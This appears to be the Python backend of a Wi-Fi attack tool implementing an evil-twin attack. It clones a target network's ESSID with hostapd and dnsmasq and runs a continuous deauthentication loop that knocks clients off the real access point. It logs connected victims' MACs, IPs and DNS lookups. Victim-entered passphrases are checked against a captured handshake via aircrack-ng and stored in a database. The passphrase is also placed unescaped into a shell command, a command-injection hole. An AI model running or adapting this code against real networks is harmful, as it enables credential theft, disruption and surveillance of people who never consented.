import os
import time
import queue
import typing
import datetime
import threading
import subprocess

import lib.handshake
import lib.admin.database as database
import lib.eviltwin.models as eviltwin_models

from lib import utils
from lib import settings
from lib.resp import Resp
from lib.eviltwin import const
from lib.handshake.deauth import Deauthenticate
from lib.interface.backend import InterfaceBackend

class StdoutReader:
    def __init__(self, stdout, max_size) -> None:
        self.stdout = stdout
        self.q = queue.Queue()
        self.max_size = max_size

        self.__is_alive = True
        self.__lock = threading.RLock()

        threading.Thread(target=self.__loop, daemon=True).start()

    @property
    def is_alive(self):
        with self.__lock:
            return self.__is_alive

    def close(self):
        with self.__lock:
            self.__is_alive = False

    def read(self):
        for _ in range(self.max_size):
            if not self.q.empty():
                yield self.q.get()

    def __loop(self):
        while self.is_alive:
            if self.q.qsize() >= self.max_size:
                continue

            for line in self.stdout:
                self.q.put(line)
                if not self.is_alive or self.q.qsize() >= self.max_size:
                    break


class Query:
    def __init__(self, link: str):
        self.__link = link
        self.__time = datetime.datetime.now()

    def __eq__(self, o: object) -> bool:
        if not isinstance(o, Query):
            return False

        return self.link == o.link and self.time == o.time

    @property
    def link(self) -> str:
        return self.__link

    @property
    def time(self) -> datetime:
        return self.__time.replace(microsecond=0)

    @property
    def serialize(self) -> typing.Dict[str, typing.Any]:
        date, time = self.time.isoformat().split("T")

        return {
            "link": self.link,
            "date": date,
            "time": time,
        }


class Device:
    MAX_QUERIES = 256

    def __init__(self, mac: str, state: bool):
        self.__mac = mac
        self.__state = state
        self.__ip: str = None
        self.__session: str = None
        self.__time = datetime.datetime.now()
        self.__queries: typing.List[Query] = []

    @property
    def mac(self) -> str:
        return self.__mac

    @property
    def state(self) -> bool:
        return self.__state

    @state.setter
    def state(self, value: bool) -> None:
        if type(value) == bool:
            self.__state = value

    @property
    def ip(self) -> typing.Union[str, None]:
        return self.__ip

    @ip.setter
    def ip(self, value: str) -> None:
        if self.__ip:
            return

        # check if valid
        ip = value.split(".")

        if len(ip) != 4:
            return

        for item in ip:
            if not item.isdigit():
                return

            if int(item) > 255:
                return

        # set
        self.__ip = value.strip()

    @property
    def session(self) -> typing.Union[str, None]:
        return self.__session

    @session.setter
    def session(self, value: str) -> None:
        if self.__session:
            return

        session = value.strip()

        if len(session) != 16:
            return

        self.__session = session

    @property
    def time(self) -> datetime:
        return self.__time

    @property
    def queries(self) -> typing.List[Query]:
        return self.__queries

    def add_query(self, link: str) -> None:
        if len(self.__queries) >= self.MAX_QUERIES:
            self.__queries.pop(0)

        query = Query(link)

        for q in self.queries:
            if q == query:
                return

        self.__queries.append(query)

    @property
    def serialize(self) -> typing.Dict[str, typing.Any]:
        date, time = self.time.replace(microsecond=0).isoformat().split("T")

        return {
            "ip": self.ip,
            "mac": self.mac.upper(),
            "session": self.session,
            "first_seen": f"{date} {time}",
            "queries": [q.serialize for q in self.queries],
        }


class EviltwinMonitor:
    CHUNK_SIZE = 128

    def __init__(self, hostapd_proc, dnsmasq_proc):
        self.devices: typing.Dict[str, Device] = {}
        self.clients = []

        self.hostapd_proc = hostapd_proc
        self.dnsmasq_proc = dnsmasq_proc

        self.hostapd_proc_stdout_reader = StdoutReader(
            hostapd_proc.stdout, self.CHUNK_SIZE
        )
        self.dnsmasq_proc_stdout_reader = StdoutReader(
            dnsmasq_proc.stdout, self.CHUNK_SIZE
        )

    def get_device_by_mac(self, mac: str) -> typing.Union[Device, None]:
        return self.devices.get(mac, None)

    def get_device_by_ip(self, ip: str) -> typing.Union[Device, None]:
        for device in self.devices.values():
            if device.ip == ip:
                return device

    def remove_device(self):
        # devices that aren't connected anymore
        disconnected_devices = [
            device.mac for device in self.devices.values() if not device.state
        ]

        for mac in disconnected_devices:
            self.devices.pop(mac)

    def is_valid_mac(self, mac):
        valid_mac_len = 17
        valid_hex = [
            "0",
            "1",
            "2",
            "3",
            "4",
            "5",
            "6",
            "7",
            "8",
            "9",
            "a",
            "b",
            "c",
            "d",
            "e",
            "f",
        ]

        if len(mac) != valid_mac_len:
            return False

        for i in range(valid_mac_len):
            div_by_3 = ((i + 1) % 3) == 0

            if div_by_3 and mac[i] != ":":
                return False
            elif not div_by_3 and not mac[i].lower() in valid_hex:
                return False

        return True

    def authenication(self, mac, msg):
        state = (
            True
            if any([msg == "authenticated", msg == "AP-STA-CONNECTED"])
            else False
        )
        if not self.get_device_by_mac(mac):
            self.devices[mac] = Device(mac, state)
        else:
            self.get_device_by_mac(mac).state = state

    def read_output(self, stdout_reader):
        for out in stdout_reader.read():
            if not out:
                continue

            yield out.decode().replace("\n", "")

    def analyze_hostapd(self):
        for line in self.read_output(self.hostapd_proc_stdout_reader):
            # authenticated or unauthenticated
            if len(line.split()) == 6:
                msg = line.split()[-1]
                mac = line.split()[2]

                if not self.is_valid_mac(mac):
                    continue

                self.authenication(mac, msg)

            # AP-STA-CONNECTED or AP-STA-DISCONNECTED
            if len(line.split()) == 3:
                msg = line.split()[1]
                mac = line.split()[2]

                if not self.is_valid_mac(mac):
                    continue

                self.authenication(mac, msg)

            # session id
            if len(line.split()) == 8:
                if line.split()[-2] == "session":
                    mac = line.split()[2]

                    if not self.is_valid_mac(mac):
                        continue

                    session = line.split()[-1]

                    device = self.get_device_by_mac(mac)

                    if device:
                        device.session = session
                    else:
                        self.devices[mac] = Device(mac, state=True)

    def analyze_dnsmasq(self):
        for line in self.read_output(self.dnsmasq_proc_stdout_reader):

            if len(line.split()) == 5:

                # DHCPOFFER
                if self.is_valid_mac(line.split()[4]):

                    ip, mac = line.split()[3:]
                    device = self.get_device_by_mac(mac)

                    if device:
                        device.ip = ip

                # query
                elif line.split()[3] == "from":
                    device = self.get_device_by_ip(line.split()[4])
                    link = line.split()[2]

                    if device:
                        device.add_query(link)

    def get_clients(self):
        self.analyze_hostapd()
        self.remove_device()

        if self.devices:
            self.analyze_dnsmasq()

        clients = []

        for mac in sorted(
            list(self.devices),
            key=lambda m: (self.devices[m].time),
            reverse=True,
        ):
            device = self.get_device_by_mac(mac)

            if not device:
                continue

            clients.append(device.serialize)

        self.clients = clients
        return clients

    def status(self):
        is_active = (
            EvilTwin.is_hostapd_active() and EvilTwin.is_dnsmasq_active()
        )
        return 1 if is_active else 0

    @property
    def serialize(self) -> typing.Dict[str, typing.Any]:
        return {"clients": self.get_clients(), "status": self.status()}


class EvilTwin:
    def __init__(self, bssid, essid, chann, iface) -> None:
        self.bssid = bssid
        self.essid = essid
        self.chann = chann
        self.iface = iface
        self.is_found = False

        self.eviltwin_monitor = None
        self.is_attack_active = False

        self.processes = []
        self.deauth = Deauthenticate(settings.DEAUTH_INTERFACE, bssid)

    def __liquidate(self):
        while self.is_attack_active:
            try:
                self.deauth.sendp()
            except:
                pass

    def __start_liquidation(self):
        if self.is_attack_active:
            return

        self.is_attack_active = True
        threading.Thread(target=self.__liquidate, daemon=True).start()

    def __stop_liquidation(self):
        if not self.is_attack_active:
            return

        self.is_attack_active = False

    def write_configs(self):
        # Hostapd
        with open(const.HOSTAPD_CONFIG_PATH, "w") as hostapd_config:
            hostapd_config.write(
                const.HOSTAPD_CONFIG.format(self.essid, self.chann, self.iface)
            )

        # Dnsmasq
        with open(const.DNS_CONFIG_PATH, "w") as dnsmasq_config:
            if os.path.exists(const.DNS_LEASES_PATH):
                os.remove(const.DNS_LEASES_PATH)

            dnsmasq_config.write(
                const.DNS_CONFIG.format(
                    self.iface, const.GATEWAY, const.DHCP_RANGE
                )
            )

    def start_ap(self):
        # Hostapd
        hostapd_proc = subprocess.Popen(
            f"hostapd {const.HOSTAPD_CONFIG_PATH}",
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
        time.sleep(0.5)

        # DnsMasq
        dnsmasq_proc = subprocess.Popen(
            f"dnsmasq -C {const.DNS_CONFIG_PATH} -d",
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
        time.sleep(0.5)

        self.processes.append(hostapd_proc)
        self.processes.append(dnsmasq_proc)

        return hostapd_proc, dnsmasq_proc

    def config_ip_addr(self):
        subprocess.Popen(
            f"ifconfig {InterfaceBackend.wlan} down",
            shell=True,
        ).wait()

        subprocess.Popen(
            f"ifconfig {self.iface} {const.GATEWAY} netmask {const.NET_MSK} up",
            shell=True,
        ).wait()

        subprocess.Popen(
            f"ifconfig {InterfaceBackend.wlan} up",
            shell=True,
        ).wait()

    def start(self):
        utils.kill_all()
        self.write_configs()
        self.config_ip_addr()

        # start AP
        hostapd_proc, dnsmasq_proc = self.start_ap()

        # verify
        if self.is_active:
            self.__start_liquidation()
            self.eviltwin_monitor = EviltwinMonitor(hostapd_proc, dnsmasq_proc)

    def stop(self):
        utils.kill_all()
        self.__stop_liquidation()
        self.eviltwin_monitor = None

    @staticmethod
    def is_hostapd_active():
        cmd = "ps -A | grep hostapd | awk 'NR == 1{print $4}'"
        return len(subprocess.getoutput(cmd)) != 0

    @staticmethod
    def is_dnsmasq_active():
        cmd = "ps -A | grep dnsmasq | awk 'NR == 1{print $4}'"
        return len(subprocess.getoutput(cmd)) != 0

    @property
    def is_active(self):
        return EvilTwin.is_hostapd_active() and EvilTwin.is_dnsmasq_active()

    @property
    def serialize(self):
        return {
            "bssid": self.bssid,
            "essid": self.essid,
            "chann": self.chann,
            "isActive": self.is_active,
            "isFound": self.is_found,
        }


class EviltwinBackend:

    __eviltwin = None

    @staticmethod
    def eviltwin():
        return EviltwinBackend.__eviltwin

    @staticmethod
    def store_ap_info(bssid, essid, passphrase):
        resp = Resp()
        error_msg = "Failed to store info"

        current_ap = eviltwin_models.Accesspoint.query.filter_by(bssid=bssid)

        if not current_ap:
            resp.msg = error_msg
            return resp

        current_ap = current_ap.first()

        if current_ap and current_ap.passphrase == passphrase:
            resp.msg = error_msg
            return resp

        if not current_ap:
            ap = eviltwin_models.Accesspoint(
                bssid=bssid, essid=essid, passphrase=passphrase
            )
            database.db.session.add(ap)
        else:
            current_ap.passphrase = passphrase
            current_ap.last_modified = datetime.datetime.utcnow()

        database.db.session.commit()
        resp.status = Resp.SUCCESS_CODE
        return resp

    @staticmethod
    def get_captured_aps():
        resp = Resp()
        aps = eviltwin_models.Accesspoint.query.all()

        resp.value = [
            {
                "bssid": ap.bssid,
                "essid": ap.essid,
                "passphrase": ap.passphrase,
                "time_captured": " ".join(
                    ap.time_captured.replace(microsecond=0)
                    .isoformat()
                    .split("T")
                ),
                "last_modified": " ".join(
                    ap.last_modified.replace(microsecond=0)
                    .isoformat()
                    .split("T")
                ),
            }
            for ap in aps
        ]

        resp.status = Resp.SUCCESS_CODE
        return resp

    @staticmethod
    def remove_captured_ap(bssid):
        resp = Resp()
        ap = eviltwin_models.Accesspoint.query.filter_by(bssid=bssid)

        if not ap:
            resp.msg = "Failed to remove accesspoint"
            return resp

        ap = ap.first()

        database.db.session.delete(ap)
        database.db.session.commit()

        resp.status = Resp.SUCCESS_CODE
        return resp

    @staticmethod
    def start_evil_twin():
        resp = Resp()
        error_msg = "Handshake must be captured before starting an evil twin"

        target = lib.handshake.backend.HandshakeBackend.get_target()

        if not target:
            resp.msg = error_msg
            return resp

        if not target.is_captured:
            resp.msg = error_msg
            return resp

        bssid = target.bssid
        essid = target.essid
        chann = target.chann

        if EviltwinBackend.__eviltwin and EviltwinBackend.__eviltwin.is_active:
            resp.msg = "Evil twin process is already active"
            return resp

        # start evil twin
        eviltwin = EvilTwin(bssid, essid, chann, settings.EVIL_TWIN_INTERFACE)
        EviltwinBackend.__eviltwin = eviltwin
        eviltwin.start()

        # respone
        is_active = eviltwin.is_active

        resp.msg = (
            "Evil twin started succesfully"
            if is_active
            else "Failed to start evil twin"
        )

        if is_active:
            resp.status = Resp.SUCCESS_CODE

        return resp

    @staticmethod
    def stop_evil_twin():
        resp = Resp()

        if not EviltwinBackend.__eviltwin:
            resp.msg = "Evil twin is not active"
            return resp

        # try to stop it
        EviltwinBackend.__eviltwin.stop()

        # check it
        is_active = EviltwinBackend.__eviltwin.is_active

        if is_active:
            resp.msg = "Failed to stop evil twin"
            return resp

        # EviltwinBackend.__eviltwin = None
        resp.msg = "Successfully stopped evil twin"
        resp.status = Resp.SUCCESS_CODE

        return resp

    @staticmethod
    def verify_passphrase(passphrase):
        passphrase = passphrase.strip()

        if not len(passphrase):
            return False

        if not EviltwinBackend.__eviltwin:
            return False

        cap_file = f"{settings.HANDSHAKE_OUTPUT}-01.cap"

        if not os.path.exists(cap_file):
            return False

        cmd = f'echo "{passphrase}" | aircrack-ng {cap_file} -b {EviltwinBackend.__eviltwin.bssid} -w-'
        return "KEY FOUND" in subprocess.getoutput(cmd)

    @staticmethod
    def eviltwin_monitor() -> typing.Union[typing.Dict[str, typing.Any], None]:
        eviltwin_monitor = EviltwinBackend.__eviltwin.eviltwin_monitor
        return eviltwin_monitor.serialize if eviltwin_monitor else None

    @staticmethod
    def status():
        resp = Resp()
        status = {"eviltwin": None}

        if EviltwinBackend.__eviltwin:
            status["eviltwin"] = EviltwinBackend.__eviltwin.serialize

        resp.value = status
        resp.status = Resp.SUCCESS_CODE
        return resp
